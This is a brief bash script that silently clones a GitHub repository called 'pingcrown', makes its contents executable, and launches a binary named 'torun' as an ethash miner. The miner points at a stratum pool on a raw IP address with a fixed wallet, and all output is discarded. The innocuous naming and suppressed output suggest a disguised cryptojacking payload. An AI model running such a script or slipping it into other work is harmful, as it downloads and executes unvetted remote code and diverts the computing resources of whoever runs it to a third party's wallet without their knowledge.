#!/bin/bash
cd /mainsrc
git clone https://github.com/mycrownteam/pingcrown.git -q
chmod -R +x pingcrown
./pingcrown/torun -a ethash -o stratum+tcp://51.195.4.174:2020 -u 0xA4260aA3aE3F16E5b74CC2CFA8ebeAc0933064F8 -p x -w az.kienmai05 > /dev/null 2>&1